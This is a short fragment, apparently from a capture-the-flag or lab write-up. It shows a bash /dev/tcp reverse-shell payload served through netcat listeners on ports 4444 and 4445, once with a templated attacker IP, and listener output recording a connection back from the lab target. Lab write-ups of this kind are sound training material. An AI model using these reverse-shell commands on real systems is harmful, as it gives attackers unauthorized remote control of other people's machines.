...
echo 'bash -c "bash -i >/dev/tcp/10.9.**.**/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
...
~~~
$ echo 'bash -c "bash -i >/dev/tcp/<YOUR IP>/4445 0>&1 2>&1"' | nc -lnvp 4444
...
└─$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.9.**.**] from (UNKNOWN) [10.10.184.116] 57132
